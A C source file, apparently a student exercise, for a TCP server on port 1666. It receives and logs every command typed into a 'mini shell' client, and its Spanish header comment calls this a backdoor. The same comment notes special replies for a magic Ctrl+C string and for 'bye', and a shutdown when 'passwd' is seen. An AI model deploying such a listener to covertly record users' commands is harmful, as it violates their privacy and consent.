/* Servidor para Mini Shell
Puerto: 1666
Funcionalidades:
- Recibe todos los comandos ejecutados en el cliente (puerta trasera)
- Maneja mensaje especial "supercaligragilisticoespilaridoso"
- Responde con mensaje específico cuando recibe Ctrl+C del cliente
- Se cierra cuando detecta comando "passwd"
*/

#include <sys/socket.h>
#include <netinet/in.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <signal.h>
#include <errno.h>
#include <time.h>

#define SERVER_PORT 1666
#define BUFFER_SIZE 1024
#define MAX_CLIENTS 10

volatile sig_atomic_t server_running = 1;

void signal_handler(int sig);
void log_message(const char *message);
void handle_client(int client_sockfd, struct sockaddr_in *client_addr);

int main() {
    int sockfd, client_sockfd;
    struct sockaddr_in server_addr, client_addr;
    socklen_t client_len = sizeof(client_addr);
    
    // Configurar manejo de señales
    signal(SIGINT, signal_handler);
    signal(SIGTERM, signal_handler);
    
    // Crear socket
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd == -1) {
        perror("Error creating socket");
        return 1;
    }
    
    // Permitir reutilizar el puerto
    int opt = 1;
    if (setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt)) < 0) {
        perror("setsockopt failed");
        close(sockfd);
        return 1;
    }
    
    // Configurar dirección del servidor
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(SERVER_PORT);
    server_addr.sin_addr.s_addr = INADDR_ANY;
    
    // Bind
    if (bind(sockfd, (struct sockaddr *)&server_addr, sizeof(server_addr)) == -1) {
        perror("Error binding socket");
        close(sockfd);
        return 1;
    }
    
    // Listen
    if (listen(sockfd, MAX_CLIENTS) == -1) {
        perror("Error listening on socket");
        close(sockfd);
        return 1;
    }
    
    printf("=== SERVIDOR MINI SHELL ===\n");
    printf("Puerto: %d\n", SERVER_PORT);
    printf("Esperando conexiones de clientes...\n");
    printf("Presiona Ctrl+C para detener el servidor\n");
    printf("============================\n\n");
    
    while (server_running) {
        client_sockfd = accept(sockfd, (struct sockaddr *)&client_addr, &client_len);
        if (client_sockfd == -1) {
            if (errno == EINTR) {
                // Interrupción por señal, continuar si el servidor sigue corriendo
                continue;
            }
            perror("Error accepting connection");
            continue;
        }
        
        log_message("Nueva conexión establecida");
        
        // En una implementación más robusta, aquí se crearía un hilo o proceso
        // para manejar múltiples clientes simultáneamente
        handle_client(client_sockfd, &client_addr);
        
        close(client_sockfd);
        log_message("Conexión cerrada");
    }
    
    close(sockfd);
    printf("\nServidor detenido.\n");
    return 0;
}

void signal_handler(int sig) {
    if (sig == SIGINT || sig == SIGTERM) {
        server_running = 0;
        printf("\nDeteniendo servidor...\n");
    }
}

void log_message(const char *message) {
    time_t now = time(NULL);
    char *time_str = ctime(&now);
    time_str[strlen(time_str) - 1] = '\0'; // Remover \n
    printf("[%s] %s\n", time_str, message);
    fflush(stdout);
}

void handle_client(int client_sockfd, struct sockaddr_in *client_addr) {
    char buffer[BUFFER_SIZE];
    char log_buffer[BUFFER_SIZE + 100];
    
    // Obtener IP del cliente
    char client_ip[INET_ADDRSTRLEN];
    inet_ntop(AF_INET, &(client_addr->sin_addr), client_ip, INET_ADDRSTRLEN);
    
    snprintf(log_buffer, sizeof(log_buffer), "Cliente conectado desde: %s:%d", 
             client_ip, ntohs(client_addr->sin_port));
    log_message(log_buffer);
    
    while (server_running) {
        ssize_t bytes_received = recv(client_sockfd, buffer, sizeof(buffer) - 1, 0);
        if (bytes_received <= 0) {
            if (bytes_received == 0) {
                log_message("Cliente desconectado normalmente");
            } else {
                log_message("Error en la conexión o cliente desconectado");
            }
            break;
        }
        
        buffer[bytes_received] = '\0';
        
        // Log de lo recibido
        snprintf(log_buffer, sizeof(log_buffer), "Recibido de %s: %s", client_ip, buffer);
        log_message(log_buffer);
        
        // Verificar mensaje especial de Ctrl+C
        if (strcmp(buffer, "supercaligragilisticoespilaridoso") == 0) {
            const char *response = "no es posible interrumpir utilizando ctrl + c";
            send(client_sockfd, response, strlen(response), 0);
            log_message("Enviada respuesta por Ctrl+C");
            continue;
        }
        
        // Verificar si contiene comando passwd
        if (strstr(buffer, "passwd") != NULL) {
            log_message("¡ALERTA! Comando 'passwd' detectado. Cerrando servidor por seguridad.");
            const char *response = "SERVIDOR: Comando passwd detectado. Cerrando conexión.";
            send(client_sockfd, response, strlen(response), 0);
            server_running = 0; // Detener el servidor
            break;
        }
        
        // Verificar comando bye
        if (strcasecmp(buffer, "bye") == 0 || strcasecmp(buffer, "bye\n") == 0) {
            const char *response = "bye";
            send(client_sockfd, response, strlen(response), 0);
            log_message("Cliente solicitó desconexión con 'bye'");
            break;
        }
        
        // Echo simple para otros mensajes
        if (strncmp(buffer, "COMANDO:", 8) == 0) {
            // Es un comando del minishell, solo loggearlo
            continue;
        } else {
            // Otro tipo de mensaje, hacer echo
            send(client_sockfd, buffer, strlen(buffer), 0);
        }
    }
}